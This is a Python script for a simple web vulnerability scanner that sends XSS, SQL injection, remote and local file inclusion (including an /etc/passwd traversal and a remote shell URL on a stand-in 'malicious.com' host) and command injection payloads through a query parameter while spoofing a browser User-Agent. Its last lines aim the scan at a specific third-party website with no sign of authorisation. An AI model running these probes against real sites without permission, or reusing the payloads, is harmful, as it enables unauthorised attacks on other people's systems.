import requests
import logging

# Function to check for XSS vulnerability
def check_xss(url, xss_payload, headers):
    try:
        response = requests.get(url + "?q=" + xss_payload, headers=headers, timeout=5)
        if xss_payload in response.text:
            logging.info("XSS Vulnerability found.")
            return {"status": "Vulnerable", "payload": xss_payload, "response_snippet": response.text[:100]}
        else:
            return {"status": "Not Vulnerable"}
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in XSS check: {e}")
        return {"status": "Error", "error": str(e)}

# Function to check for SQL Injection vulnerability
def check_sql_injection(url, sql_payload, headers):
    try:
        response = requests.get(url + "?q=" + sql_payload, headers=headers, timeout=5)
        if "mysql" in response.text.lower() or "syntax error" in response.text.lower():
            logging.info("SQL Injection vulnerability found.")
            return {"status": "Vulnerable", "payload": sql_payload, "response_snippet": response.text[:100]}
        else:
            return {"status": "Not Vulnerable"}
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SQL Injection check: {e}")
        return {"status": "Error", "error": str(e)}

# Function to check for RFI vulnerability
def check_rfi(url, rfi_payload, headers):
    try:
        response = requests.get(url + "?q=" + rfi_payload, headers=headers, timeout=5)
        if "shell" in response.text:
            logging.info("Remote File Inclusion (RFI) vulnerability found.")
            return {"status": "Vulnerable", "payload": rfi_payload, "response_snippet": response.text[:100]}
        else:
            return {"status": "Not Vulnerable"}
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in RFI check: {e}")
        return {"status": "Error", "error": str(e)}

# Function to check for LFI vulnerability
def check_lfi(url, lfi_payload, headers):
    try:
        response = requests.get(url + "?q=" + lfi_payload, headers=headers, timeout=5)
        if "root" in response.text:
            logging.info("Local File Inclusion (LFI) vulnerability found.")
            return {"status": "Vulnerable", "payload": lfi_payload, "response_snippet": response.text[:100]}
        else:
            return {"status": "Not Vulnerable"}
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in LFI check: {e}")
        return {"status": "Error", "error": str(e)}

# Function to check for Command Injection vulnerability
def check_command_injection(url, ci_payload, headers):
    try:
        response = requests.get(url + "?q=" + ci_payload, headers=headers, timeout=5)
        if "total" in response.text:
            logging.info("Command Injection vulnerability found.")
            return {"status": "Vulnerable", "payload": ci_payload, "response_snippet": response.text[:100]}
        else:
            return {"status": "Not Vulnerable"}
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in Command Injection check: {e}")
        return {"status": "Error", "error": str(e)}

# Main function to perform vulnerability scanning
def vulnerability_scanner(url, custom_headers=None):
    logging.info(f"Starting vulnerability scanning on {url}...")
    
    # Default User-Agent to simulate a real browser
    headers = custom_headers if custom_headers else {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    # Payloads for each vulnerability check
    xss_payload = "<script>alert(1)</script>"
    sql_payload = "' OR '1'='1"
    rfi_payload = "http://malicious.com/shell.txt"
    lfi_payload = "../../../../etc/passwd"
    command_injection_payload = "; ls -la"

    vulnerabilities = {}
    
    # Perform individual vulnerability checks
    vulnerabilities['XSS'] = check_xss(url, xss_payload, headers)
    vulnerabilities['SQL Injection'] = check_sql_injection(url, sql_payload, headers)
    vulnerabilities['RFI'] = check_rfi(url, rfi_payload, headers)
    vulnerabilities['LFI'] = check_lfi(url, lfi_payload, headers)
    vulnerabilities['Command Injection'] = check_command_injection(url, command_injection_payload, headers)
    
    logging.info(f"Completed vulnerability scanning on {url}.")
    
    return vulnerabilities
url = "http://pornhat.one"
scan_results = vulnerability_scanner(url)
print(scan_results)
